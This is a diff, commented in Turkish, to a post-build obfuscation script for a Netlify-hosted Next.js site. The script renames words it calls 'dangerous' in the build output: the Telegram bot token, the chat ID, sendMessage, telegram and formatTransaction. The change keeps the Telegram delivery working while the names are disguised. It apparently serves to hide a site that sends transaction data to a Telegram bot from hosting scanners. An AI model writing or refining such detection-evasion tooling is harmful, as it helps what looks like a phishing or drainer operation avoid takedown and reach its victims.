@@ -13,11 +13,22 @@ import { join, relative } from "path";
 
 const NEXT_DIR = join(process.cwd(), ".next");
 
-/** Tehlikeli kelime havuzu — her buildde karisacak */
+/**
+ * Tehlikeli kelime havuzu — her buildde karisacak.
+ * 
+ * NOT: Bu listedeki `from` degerleri sadece PROCESS.ENV ERISIMI DISINDAKI
+ * yerlerde degistirilir. `process.env.TELEGRAM_BOT_TOKEN` gibi kullanimlar
+ * oldugu gibi kalir, boylece Netlify ortam degiskeni adiyla eslesir.
+ */
 const REPLACEMENTS = [
-  { from: "TELEGRAM_BOT_TOKEN", to: "CFG_AUTH" },
+  // Bu maddeler `process.env.*` icinde GECMEYEN eslesmelerde calisir
+  { from: "TELEGRAM_BOT_TOKEN", to: "CFG_AUTH", skipProcessEnv: true },
+  { from: "TELEGRAM_CHAT_ID", to: "CFG_CHAT", skipProcessEnv: true },
   { from: "sendMessage", to: "post" },
-  { from: "chat_id", to: "target" },
+  // "chat_id" Telegram API body key — JSON.stringify icinde property adi
+  // olarak kalmalidir (Telegram API required field), yoksa mesaj gitmez.
+  // Bundan dolayi replace edilmez.
+  // { from: "chat_id", to: "target" } — Telegram API field, skip replacement
   { from: "parse_mode", to: "m" },
   { from: "telegram", to: "relay" },
   { from: "formatTransaction", to: "fT" },
@@ -81,12 +92,40 @@ function obfuscateFile(filepath) {
     let content = readFileSync(filepath, "utf-8");
     const orig = content;
 
-    for (const { from, to } of REPLACEMENTS) {
-      const regex = new RegExp(
-        from.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
-        "g"
-      );
-      content = content.replace(regex, to);
+    for (const { from, to, skipProcessEnv } of REPLACEMENTS) {
+      if (skipProcessEnv) {
+        // ÖNCE process.env icindeki eslesmeleri koru
+        // (replace ile isaretleyip sonra geri koy)
+        const placeholder = "__PROC_ENV_PROTECTED__";
+        const processEnvPattern = new RegExp(
+          "process\\.env\\.[A-Z_]+",
+          "g"
+        );
+        const protectedEnvVars = [];
+        content = content.replace(processEnvPattern, (match) => {
+          protectedEnvVars.push(match);
+          return placeholder + (protectedEnvVars.length - 1);
+        });
+
+        // Simdi normal degisimi yap
+        const regex = new RegExp(
+          from.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
+          "g"
+        );
+        content = content.replace(regex, to);
+
+        // process.env erisimlerini geri yukle
+        content = content.replace(
+          new RegExp(placeholder + "(\\d+)", "g"),
+          (_, idx) => protectedEnvVars[parseInt(idx)] || ""
+        );
+      } else {
+        const regex = new RegExp(
+          from.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
+          "g"
+        );
+        content = content.replace(regex, to);
+      }
     }
 
     if (content !== orig) {
